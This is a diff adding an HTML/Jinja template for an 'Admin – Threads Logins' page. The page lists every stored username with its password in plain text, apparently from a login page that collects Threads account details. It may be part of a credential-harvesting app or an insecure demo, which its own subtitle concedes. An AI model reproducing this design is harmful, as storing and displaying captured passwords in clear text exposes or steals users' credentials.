@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Admin – Threads Logins</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+</head>
+<body>
+<div class="container">
+    <div class="card admin-card">
+        <h1 class="title">Admin Panel</h1>
+        <p class="subtitle">All stored login details (raw – not secure for real use).</p>
+
+        <table class="db-table">
+            <thead>
+            <tr>
+                <th>ID</th>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Created At</th>
+            </tr>
+            </thead>
+            <tbody>
+            {% for row in logins %}
+                <tr>
+                    <td>{{ row[0] }}</td>
+                    <td>{{ row[1] }}</td>
+                    <td>{{ row[2] }}</td>
+                    <td>{{ row[3] }}</td>
+                </tr>
+            {% else %}
+                <tr>
+                    <td colspan="4" style="text-align:center;">No records yet.</td>
+                </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+
+        <a href="{{ url_for('index') }}" class="back-link">← Back to login</a>
+    </div>
+</div>
+</body>
+</html>
